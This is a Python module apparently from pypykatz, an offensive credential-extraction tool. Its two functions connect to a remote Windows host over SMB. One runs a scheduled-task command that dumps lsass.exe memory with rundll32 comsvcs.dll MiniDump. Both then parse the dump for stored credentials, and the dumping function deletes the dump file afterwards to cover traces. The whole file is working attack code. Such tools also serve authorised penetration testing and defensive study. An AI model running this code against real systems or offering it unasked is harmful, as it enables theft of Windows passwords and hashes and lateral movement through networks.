import asyncio
import os

from pypykatz import logging

async def lsassfile(url, packages = ['all'], chunksize = 64*1024):
	from aiosmb.commons.connection.url import SMBConnectionURL
	from pypykatz.alsadecryptor.asbmfile import SMBFileReader
	from pypykatz.apypykatz import apypykatz

	smburl = SMBConnectionURL(url)
	connection = smburl.get_connection()
	smbfile = smburl.get_file()

	async with connection:
		logging.debug('[LSASSFILE] Connecting to server...')
		_, err = await connection.login()
		if err is not None:
			raise err
		
		logging.debug('[LSASSFILE] Connected!')
		logging.debug('[LSASSFILE] Opening LSASS dump file...')
		_, err = await smbfile.open(connection)
		if err is not None:
			raise err
		
		logging.debug('[LSASSFILE] LSASS file opened!')
		logging.debug('[LSASSFILE] parsing LSASS file...')
		mimi = await apypykatz.parse_minidump_external(SMBFileReader(smbfile), chunksize=chunksize, packages = packages)
		logging.debug('[LSASSFILE] LSASS file parsed OK!')
		return mimi

async def lsassdump(url, method = 'taskexec', remote_base_path = 'C:\\Windows\\Temp\\', remote_share_name = '\\c$\\Windows\\Temp\\',chunksize = 64*1024, packages = ['all']):
	from aiosmb.commons.exceptions import SMBException
	from aiosmb.wintypes.ntstatus import NTStatus
	from aiosmb.commons.connection.url import SMBConnectionURL
	from aiosmb.commons.interfaces.machine import SMBMachine
	from pypykatz.alsadecryptor.asbmfile import SMBFileReader
	from aiosmb.commons.interfaces.file import SMBFile
	from pypykatz.apypykatz import apypykatz

	smburl = SMBConnectionURL(url)
	connection = smburl.get_connection()

	if remote_base_path.endswith('\\') is False:
		remote_base_path += '\\'

	if remote_share_name.endswith('\\') is False:
		remote_share_name += '\\'

	fname = '%s.%s' % (os.urandom(5).hex(), os.urandom(3).hex())
	filepath = remote_base_path + fname
	filesharepath = remote_share_name + fname
	
	if method == 'taskexec':
		cmd = """for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump ^%B {} full""".format(filepath)
		commands = [cmd]
	
	else:
		raise Exception('Unknown execution method %s' % method)

	mimi = None
	async with connection:
		logging.debug('[LSASSDUMP] Connecting to server...')
		_, err = await connection.login()
		if err is not None:
			raise err
		logging.debug('[LSASSDUMP] Connected!')
		async with SMBMachine(connection) as machine:
			if method == 'taskexec':
				logging.debug('[LSASSDUMP] Start dumping LSASS with taskexec method!')
				logging.info('[LSASSDUMP] File location: %s' % filepath)
				_, err = await machine.tasks_execute_commands(commands)
				if err is not None:
					raise err
				
				logging.debug('[LSASSDUMP] Sleeping a bit to let the remote host finish dumping')
				await asyncio.sleep(10)
			
			else:
				raise Exception('Unknown execution method %s' % method)
		
		logging.debug('[LSASSDUMP] Opening LSASS dump file...')
		for _ in range(3):
			smbfile = SMBFileReader(SMBFile.from_remotepath(connection, filesharepath))
			_, err = await smbfile.open(connection)
			if err is not None:
				if isinstance(err, SMBException):
					if err.ntstatus == NTStatus.SHARING_VIOLATION:
						logging.debug('[LSASSDUMP] LSASS dump is not yet ready, retrying...')
						await asyncio.sleep(1)
						continue
				raise err
			break
		else:
			raise err
		
		logging.debug('[LSASSDUMP] LSASS dump file opened!')
		logging.debug('[LSASSDUMP] parsing LSASS dump file on the remote host...')
		mimi = await apypykatz.parse_minidump_external(smbfile, chunksize=chunksize, packages = packages)

		logging.debug('[LSASSDUMP] parsing OK!')
		logging.debug('[LSASSDUMP] Deleting remote dump file...')
		_, err = await smbfile.delete()
		if err is not None:
			logging.info('[LSASSDUMP] Failed to delete LSASS file! Reason: %s' % err)
		else:
			logging.info('[LSASSDUMP] remote LSASS file deleted OK!')
	
	return mimi